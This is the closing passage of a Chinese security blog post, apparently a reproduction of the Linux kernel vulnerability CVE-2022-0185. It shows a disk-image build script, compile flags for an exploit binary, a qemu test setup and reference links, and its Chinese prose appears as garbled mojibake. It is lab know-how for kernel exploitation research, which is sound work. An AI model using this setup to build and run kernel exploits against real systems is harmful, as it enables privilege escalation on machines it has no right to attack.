class="variable">$DIR</span>/etc/fstab</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;securityfs /sys/kernel/security securityfs defaults 0 0&#x27;</span> | sudo tee -a <span class="variable">$DIR</span>/etc/fstab</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;configfs /sys/kernel/config/ configfs defaults 0 0&#x27;</span> | sudo tee -a <span class="variable">$DIR</span>/etc/fstab</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;binfmt_misc /proc/sys/fs/binfmt_misc binfmt_misc defaults 0 0&#x27;</span> | sudo tee -a <span class="variable">$DIR</span>/etc/fstab</span><br><span class="line"><span class="built_in">echo</span> -en <span class="string">&quot;127.0.0.1\tlocalhost\n&quot;</span> | sudo tee <span class="variable">$DIR</span>/etc/hosts</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;nameserver 8.8.8.8&quot;</span> | sudo tee -a <span class="variable">$DIR</span>/etc/resolve.conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;syzkaller&quot;</span> | sudo tee <span class="variable">$DIR</span>/etc/hostname</span><br><span class="line">ssh-keygen -f <span class="variable">$RELEASE</span>.id_rsa -t rsa -N <span class="string">&#x27;&#x27;</span></span><br><span class="line">sudo mkdir -p <span class="variable">$DIR</span>/root/.ssh/</span><br><span class="line">cat <span class="variable">$RELEASE</span>.id_rsa.pub | sudo tee <span class="variable">$DIR</span>/root/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Add perf support</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$PERF</span> = <span class="string">&quot;true&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    cp -r <span class="variable">$KERNEL</span> <span class="variable">$DIR</span>/tmp/</span><br><span class="line">    BASENAME=$(basename <span class="variable">$KERNEL</span>)</span><br><span class="line">    sudo chroot <span class="variable">$DIR</span> /bin/bash -c <span class="string">&quot;apt-get update; apt-get install -y flex bison python-dev libelf-dev libunwind8-dev libaudit-dev libslang2-dev libperl-dev binutils-dev liblzma-dev libnuma-dev&quot;</span></span><br><span class="line">    sudo chroot <span class="variable">$DIR</span> /bin/bash -c <span class="string">&quot;cd /tmp/<span class="variable">$BASENAME</span>/tools/perf/; make&quot;</span></span><br><span class="line">    sudo chroot <span class="variable">$DIR</span> /bin/bash -c <span class="string">&quot;cp /tmp/<span class="variable">$BASENAME</span>/tools/perf/perf /usr/bin/&quot;</span></span><br><span class="line">    rm -r <span class="variable">$DIR</span>/tmp/<span class="variable">$BASENAME</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Add udev rules for custom drivers.</span></span><br><span class="line"><span class="comment"># Create a /dev/vim2m symlink for the device managed by the vim2m driver</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;ATTR&#123;name&#125;==&quot;vim2m&quot;, SYMLINK+=&quot;vim2m&quot;&#x27;</span> | sudo tee -a <span class="variable">$DIR</span>/etc/udev/rules.d/50-udev-default.rules</span><br><span class="line"></span><br><span class="line"><span class="comment"># Build a disk image</span></span><br><span class="line">dd <span class="keyword">if</span>=/dev/zero of=<span class="variable">$RELEASE</span>.img bs=1M seek=<span class="variable">$SEEK</span> count=1</span><br><span class="line">sudo mkfs.ext4 -F <span class="variable">$RELEASE</span>.img</span><br><span class="line">sudo mkdir -p /mnt/<span class="variable">$DIR</span></span><br><span class="line">sudo mount -o loop <span class="variable">$RELEASE</span>.img /mnt/<span class="variable">$DIR</span></span><br><span class="line">sudo cp -a <span class="variable">$DIR</span>/. /mnt/<span class="variable">$DIR</span>/.</span><br><span class="line">sudo umount /mnt/<span class="variable">$DIR</span></span><br></pre></td></tr></table></figure>

<p>å› ä¸ºæˆ‘ä¹Ÿç¨åšäº†ç‚¹ä¿®æ”¹ï¼Œæ€•ä»¥åå¿˜è®°äº†è¿™é‡Œè´´å‡ºæ¥è®°å½•ä¸€ä¸‹ã€‚</p>
<p>ç¬¬äºŒä¸ªå‘å°±æ˜¯å…³äºä¸Šé¢æåˆ°çš„å†…éƒ¨éš”ç¦»é—®é¢˜ï¼ŒåŒæ ·ä¹Ÿæ˜¯åœ¨æŸä½å¸ˆå‚…çš„åšå®¢æ–‡ç« ä¸­æåˆ°äº†åœ¨<code>linux kernel 5.14</code>ä»¥å‰ä¸å­˜åœ¨å†…éƒ¨éš”ç¦»é—®é¢˜ï¼Œéšå³å±…ç„¶ä»¥ä¸‹çŠ¯ä¸Šå»è¯´a3å¸ˆå‚…å†™çš„ctfwikié”™äº†ï¼Œåœ¨ç»è¿‡å‡ å¤©æŒ£æ‰ä¹‹åç»ˆäºæ³¨æ„åˆ°äº†åœ¨<code>linux kernel 5.9</code>ä»¥å‰çš„å†…éƒ¨éš”ç¦»å®ç°ã€‚</p>
<p>å†è®°å½•ä¸€ä¸‹ç¼–è¯‘é€‰é¡¹</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">gcc exp.c -masm=intel -static -no-pie -Wall -D_FILE_OFFSET_BITS=64 -I./libfuse libfuse3.a -g -lpthread -o exp -w</span><br><span class="line"><span class="comment"># make fuse</span></span><br><span class="line">sudo mount bullseye.img rootfs</span><br><span class="line">sudo cp exp rootfs/home/<span class="built_in">test</span></span><br><span class="line">objdump -d ./exp &gt; exp.txt</span><br><span class="line">sudo mkdir rootfs/home/<span class="built_in">test</span>/temp</span><br><span class="line">sudo umount rootfs</span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">  -cpu kvm64,+smep,+smap \</span><br><span class="line">  -kernel ./vmlinux \</span><br><span class="line">  -append <span class="string">&quot;console=ttyS0 root=/dev/sda rw&quot;</span> \</span><br><span class="line">  -hda ./bullseye.img \</span><br><span class="line">  -enable-kvm -m 3G -nographic \</span><br><span class="line">  -netdev user,id=t0, -device rtl8139,netdev=t0,id=nic0 \</span><br><span class="line">  -netdev user,id=t1, -device pcnet,netdev=t1,id=nic1 \</span><br><span class="line">  -s</span><br></pre></td></tr></table></figure>

<hr>
<p>å‚è€ƒé“¾æ¥ï¼š</p>
<p>â€‹	<a class="link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2023/01/11/CVE-0X09-CVE-2022-0185/" >https://arttnba3.cn/2023/01/11/CVE-0X09-CVE-2022-0185/<i class="fas fa-external-link-alt"></i></a></p>
<p>â€‹	<a class="link"   target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/93592262" >https://zhuanlan.zhihu.com/p/93592262<i class="fas fa-external-link-alt"></i></a></p>
<p>â€‹	<a class="link"   target="_blank" rel="noopener" href="https://www.willsroot.io/2022/01/cve-2022-0185.html" >https://www.willsroot.io/2022/01/cve-2022-0185.html<i class="fas fa-external-link-alt"></i></a></p>
<p>â€‹	<a class="link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.4/source" >https://elixir.bootlin.com/linux/v5.4/source<i class="fas fa-external-link-alt"></i></a></p>
<p>â€‹	<a class="link"   target="_blank" rel="noopener" href="https://github.com/Crusaders-of-Rust/CVE-2022-0185" >https://github.com/Crusaders-of-Rust/CVE-2022-0185<i class="fas fa-external-link-alt"></i></a></p>

                    
                </div>

                

                <div class="post-bottom-tags-and-share border-box">
                    <div>
                        
                            <ul class="post-tags-box border-box">
                                
                                    <li class="tag-item border-box">
                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/msg-msg/">msg_msg</a>
                                    </li>
                                
                                    <li class="tag-item border-box">
                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/pipe-buffer/">pipe_buffer</a>
                                    </li>
                                
                                    <li class="tag-item border-box">
                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/Filesystem/">Filesystem</a>
                                    </li>
                                
                                    <li class="tag-item border-box">
                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/fuse/">fuse</a>
                                    </li>
                                
                                    <li class="tag-item border-box">
                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/seq-operations/">seq_operations</a>
                                    </li>
                                
                            </ul>
                        
                    </div>
                    <div>
                        
                    </div>
                </div>

                

                
                    <div class="post-nav border-box">
                        
                            <div class="prev-post">
                                <a class="prev"
                                   rel="prev"
                                   href="/2023/10/27/CVE-2022-2588/"
                                   title="CVE-2022-2588å¤ç°"
                                >
                                    <span class="left arrow-icon flex-center">
                                        <i class="fas fa-chevron-left"></i>
                                    </span>
                                    <span class="title flex-center">
                                        <span class="post-nav-title-item text-ellipsis">CVE-2022-2588å¤ç°</span>
                                        <span class="post-nav-item">ä¸Šä¸€ç¯‡</span>
                                    </span>
                                </a>
                            </div>
                        
                        
                            <div class="next-post">
                                <a class="next"
                                   rel="next"
                                   href="/2023/09/30/%E6%B5%85%E5%B0%9Ddocker-escape/"
                                   title="æµ…å°docker escape"
                                >
                                    <span class="title flex-center">
                                        <span class="post-nav-title-item text-ellipsis">æµ…å°docker escape</span>
                                        <span class="post-nav-item">ä¸‹ä¸€ç¯‡</span>
                                    </span>
                                    <span class="right arrow-icon flex-center">
                                        <i class="fas fa-chevron-right"></i>
                                    </span>
                                </a>
                            </div>
                        
                    </div>
                

                
                    


    <div class="comments-container border-box">
        <div id="comments-anchor" class="comment-area-title border-box">
            <i class="fas fa-comments"></i>&nbsp;è¯„è®º
        </div>
        <div class="comment-plugin-fail border-box">
    <span class="fail-tip">è¯„è®ºæ’ä»¶åŠ è½½å¤±è´¥</span>
    <button class="reload keep-button">ç‚¹å‡»é‡æ–°åŠ è½½</button>
</div>
<div class="comment-plugin-loading flex-center border-box">
    <i class="loading-icon fa-solid fa-spinner fa-spin"></i>
    <span class="load-tip">æ­£åœ¨åŠ è½½è¯„è®ºæ’ä»¶</span>
</div>
<script data-pjax>
  window.KeepCommentPlugin = {}
  window.KeepCommentPlugin.hideLoading = () => {
    const cplDom = document.querySelector('.comments-container .comment-plugin-loading')
    cplDom.style.display = 'none'
  }
  window.KeepCommentPlugin.loadFailHandle = () => {
    window.KeepCommentPlugin.hideLoading()
    const cpfDom = document.querySelector('.comments-container .comment-plugin-fail')
    cpfDom.style.display = 'flex'
    cpfDom.querySelector('.reload').addEventListener('click', () => {
      window.location.reload()
    })
  }
</script>

        
            

    <div class="valine-container">
        <div id="vcomments"></div>
        <script 
                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"
                async
                onerror="window.KeepCommentPlugin.loadFailHandle()"
        ></script>
        <script 
                async
                onerror="window.KeepCommentPlugin.loadFailHandle()"
        >
          window.KeepCommentPlugin.initValine = () => {
            const config = {
              el: '#vcomments',
              appId: 'OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz',
              appKey: 'C672AAYGXMkHxztf8ntdLShs',
              meta: ['nick', 'mail', 'link'],
              avatar: 'wavatar',
              enableQQ: true,
              placeholder: 'ğŸ˜œè‹¥æœ‰é—®é¢˜è¯·å„ä½å¤§å¸ˆå‚…ç•™è¨€è¯„è®ºï¼ˆç•™ä¸‹é‚®ç®±æœ‰é€šçŸ¥å“¦ï½ï¼‰',
              lang: 'zh-CN'.toLowerCase()
            }

            if ('') {
              config.serverURLs = ''
            }

            if (window?.Valine) {
              new Valine(config)
              window.KeepCommentPlugin.hideLoading()
            } else {
              setTimeout(() => {
                window.KeepCommentPlugin.initValine()
              }, 1000)
            }
          }

          if ('false' === 'true') {
            setTimeout(() => {
              window.KeepCommentPlugin.initValine()
            }, 1200)
          } else {
            window.addEventListener('DOMContentLoaded', window.KeepCommentPlugin.initValine)
          }
        </script>
    </div>


        
    </div>





                
            </div>
        </div>

        
            <div class="pc-post-toc right-toc">
                <div class="post-toc-wrap border-box">
    <div class="post-toc border-box">
        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">å‰è¨€</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Filesystem-mount-API-%E5%88%86%E6%9E%90"><span class="nav-text">Filesystem mount API åˆ†æ</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#fsopen"><span class="nav-text">fsopen</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fsconfig"><span class="nav-text">fsconfig</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fsmount"><span class="nav-text">fsmount</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#move-mount"><span class="nav-text">move_mount</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">æ¼æ´åˆ†æ</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">æ¼æ´åˆ©ç”¨</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#FUSE"><span class="nav-text">FUSE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pipe-buffer"><span class="nav-text">pipe_buffer</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E9%83%A8%E9%9A%94%E7%A6%BB%E5%88%86%E6%9E%90"><span class="nav-text">å†…éƒ¨éš”ç¦»åˆ†æ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#msg-msg"><span class="nav-text">msg_msg</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%BC%E4%B8%8A%E5%8F%AF%E5%BE%97exp"><span class="nav-text">ç»¼ä¸Šå¯å¾—exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B8%A9%E5%9D%91%E8%AE%B0"><span class="nav-text">è¸©å‘è®°</span></a></li></ol></li></ol>
    </div>
</div>

            </div>
        
    </div>
</div>


                
            </div>
        </div>

        <div class="page-main-content-bottom border-box">
            
<footer class="footer border-box">
    <div class="copyright-info info-item">
        &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2025
        
            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">196082</a>
        
    </div>

    <div class="theme-info info-item">
        ç”±&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;é©±åŠ¨&nbsp;&&nbsp;ä¸»é¢˜&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
    </div>

    
        
        <div class="deploy-info info-item">
            
            æœ¬ç«™ç”± <span class="tooltip" data-tooltip-content="GitHub Pages"><img src="/images/brands/github.png"></span> æä¾›éƒ¨ç½²æœåŠ¡
            
        </div>
    

    
        <div class="count-info info-item">
            
                <span class="count-item border-box word">
                    <span class="item-type border-box">æ€»å­—æ•°</span>
                    <span class="item-value border-box word">335.6k</span>
                </span>
            

            
                <span class="count-item border-box uv">
                    <span class="item-type border-box">è®¿å®¢æ•°</span>
                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
                </span>
            

            
                <span class="count-item border-box pv">
                    <span class="item-type border-box">è®¿é—®é‡</span>
                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
                </span>
            
        </div>
    

    
</footer>

        </div>
    </div>

    <!-- post tools -->
    
        <div class="post-tools right-toc">
            <div class="post-tools-container border-box">
    <ul class="post-tools-list border-box">
        <!-- PC encrypt again -->
        

        <!-- PC TOC show toggle -->
        
            <li class="tools-item flex-center toggle-show-toc">
                <i class="fas fa-list"></i>
            </li>
        

        <!-- PC go comment -->
        
            <li class="tools-item flex-center go-to-comments">
                <i class="fas fa-comment"></i>
                <span class="post-comments-count"></span>
            </li>
        

        <!-- PC full screen -->
        <li class="tools-item flex-center full-screen">
            <i class="fa-solid fa-expand"></i>
        </li>
    </ul>
</div>

        </div>
    

    <!-- side tools -->
    <div class="side-tools">
        <div class="side-tools-container border-box ">
    <ul class="side-tools-list side-tools-show-handle border-box">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <!-- toggle mode -->
        
            <li class="tools-item tool-toggle-theme-mode flex-center">
                <i class="fas fa-moon"></i>
            </li>
        

        <!-- rss -->
        
            <li class="tools-item rss flex-center">
                <a class="flex-center"
                   href="/atom.xml"
                   target="_blank"
                >
                    <i class="fas fa-rss"></i>
                </a>
            </li>
        

        <!-- to bottom -->
        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list border-box">
        
            <li class="tools-item toggle-show-toc-tablet flex-center">
                <i class="fas fa-list"></i>
            </li>
        

        
            <li class="tools-item go-to-comments-tablet flex-center">
                <i class="fas fa-comment"></i>
            </li>
        

        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>

        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
            <i class="arrow fas fa-arrow-up"></i>
            <span class="percent"></span>
        </li>
    </ul>
</div>

    </div>

    <!-- image mask -->
    <div class="zoom-in-image-mask">
    <img class="zoom-in-image">
</div>


    <!-- local search -->
    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="æœç´¢..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="close-popup-btn">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

    <!-- tablet toc -->
    
        <div class="tablet-post-toc-mask">
            <div class="tablet-post-toc">
                <div class="post-toc-wrap border-box">
    <div class="post-toc border-box">
        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">å‰è¨€</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Filesystem-mount-API-%E5%88%86%E6%9E%90"><span class="nav-text">Filesystem mount API åˆ†æ</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#fsopen"><span class="nav-text">fsopen</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fsconfig"><span class="nav-text">fsconfig</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fsmount"><span class="nav-text">fsmount</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#move-mount"><span class="nav-text">move_mount</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">æ¼æ´åˆ†æ</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">æ¼æ´åˆ©ç”¨</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#FUSE"><span class="nav-text">FUSE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pipe-buffer"><span class="nav-text">pipe_buffer</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E9%83%A8%E9%9A%94%E7%A6%BB%E5%88%86%E6%9E%90"><span class="nav-text">å†…éƒ¨éš”ç¦»åˆ†æ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#msg-msg"><span class="nav-text">msg_msg</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%BC%E4%B8%8A%E5%8F%AF%E5%BE%97exp"><span class="nav-text">ç»¼ä¸Šå¯å¾—exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B8%A9%E5%9D%91%E8%AE%B0"><span class="nav-text">è¸©å‘è®°</span></a></li></ol></li></ol>
    </div>
</div>

            </div>
        </div>
    
</main>





<!-- common js -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/utils.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/header-shrink.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/back2top.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/toggle-theme.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/code-block.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/main.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/libs/anime.min.js"></script>

<!-- local search -->

    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/local-search.min.js"></script>


<!-- lazyload -->

    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/lazyload.min.js"></script>


<div class="">
    <!-- home page -->
    

    <!-- post page -->
    
        <!-- post-helper -->
        <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/post/post-helper.min.js"></script>

        <!-- toc -->
        
            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/post/toc.min.js"></script>
        

        <!-- copyright-info -->
        

        <!-- share -->
        
    

    <!-- categories page -->
    

    <!-- links page -->
    

    <!-- photos page -->
    

    <!-- tools page -->
    
</div>

<!-- mermaid -->


<!-- pjax -->



</body>
</html>
